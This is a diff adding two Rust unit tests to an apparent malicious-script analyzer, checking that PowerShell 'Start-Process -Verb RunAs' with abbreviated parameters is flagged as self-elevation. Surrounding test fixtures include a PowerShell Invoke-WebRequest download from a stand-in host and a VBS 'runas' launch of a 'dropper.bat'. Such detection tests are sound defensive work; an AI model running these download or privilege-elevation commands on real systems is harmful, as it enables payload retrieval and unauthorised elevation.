@@ -1466,6 +1466,40 @@ sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p"
     }
 
     #[test]
+    fn start_process_verb_runas_captures_abbreviated_argument_list() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath powershell.exe -Args '-Command echo hi' -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "-Command echo hi"
+            )),
+            "abbreviated argument list SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_abbreviated_file_path() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -File powershell.exe -Args '-Command echo hi' -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "-Command echo hi"
+            )),
+            "abbreviated file path SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn vbs_shell_execute_runas_emits_self_elevation_trait() {
         let script = br#"Set UAC = CreateObject("Shell.Application")
 UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
